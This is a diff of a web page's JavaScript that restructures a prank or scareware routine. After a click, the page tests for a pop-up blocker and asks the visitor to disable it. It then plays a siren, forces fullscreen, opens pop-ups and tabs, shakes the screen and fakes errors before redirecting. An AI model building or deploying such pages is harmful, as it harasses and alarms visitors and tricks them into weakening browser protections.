@@ -109,6 +109,21 @@
 
         document.getElementById('clickOverlay').addEventListener('click', function() {
             this.classList.add('hidden');
+            checkPopups(); // Check for pop-up blocker
+        });
+
+        function checkPopups() {
+            const testPopup = window.open("", "_blank"); // Attempt to open a blank pop-up
+            
+            if (testPopup) {
+                testPopup.close(); // Close the pop-up if it opened successfully
+                startChaos(); // Start the chaotic behavior
+            } else {
+                alert("Please enable pop-ups to continue to this site."); // Alert if blocked
+            }
+        }
+
+        function startChaos() {
             const sirenAudio = document.getElementById('sirenAudio');
             sirenAudio.currentTime = 0; 
             sirenAudio.play().catch(error => {
@@ -123,8 +138,7 @@
             // Request fullscreen
             enterFullScreen();
 
-            checkPopups(); // Check for pop-up blocker
-
+            startPopupsAndTabs(); // Start the opening of popups
             chaoticMouseMovement();
             startScreenShake(); 
 
@@ -144,7 +158,7 @@
                 clearInterval(cursorMoveInterval);
                 window.location.href = "https://funpage.example.com"; 
             }, 10000); 
-        });
+        }
 
         function chaoticMouseMovement() {
             const randomMouseClick = () => {
@@ -174,17 +188,6 @@
             ];
             const randomMessage = errorMessages[Math.floor(Math.random() * errorMessages.length)];
             console.log(randomMessage);
-        }
-
-        function checkPopups() {
-            const testPopup = window.open("", "_blank"); // Attempt to open a blank pop-up
-            
-            if (testPopup) {
-                testPopup.close(); // Close the pop-up if it opened successfully
-                startPopupsAndTabs(); // Start the opening of tabs
-            } else {
-                alert("Please enable pop-ups to continue to this site."); // Alert if blocked
-            }
         }
 
         function startPopupsAndTabs() {
